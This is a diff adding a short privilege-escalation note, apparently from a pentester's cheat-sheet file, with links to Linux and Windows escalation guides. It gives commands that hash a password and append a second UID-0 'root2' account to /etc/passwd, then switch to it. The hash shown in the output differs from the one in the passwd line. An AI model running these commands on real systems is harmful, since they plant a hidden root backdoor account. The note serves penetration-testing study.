@@ -1,3 +1,20 @@
+===
+Privilege escalation using passwd file
+credit: https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file
+
+# to generate hash of the password
+openssl passwd mrcake
+hKLD3431415ZE
+
+# to create a second root user with "mrcake" password
+echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# to switch to a root2
+su root2
+Password: mrcake 
+===
+
+
 https://guif.re/linuxeophttps://guif.re/windowseop
 https://netsec.ws/?p=337
 http://asystemengineersnotebook.blogspot.com/2017/07/a-dirty-privilege-escalation-trick.html
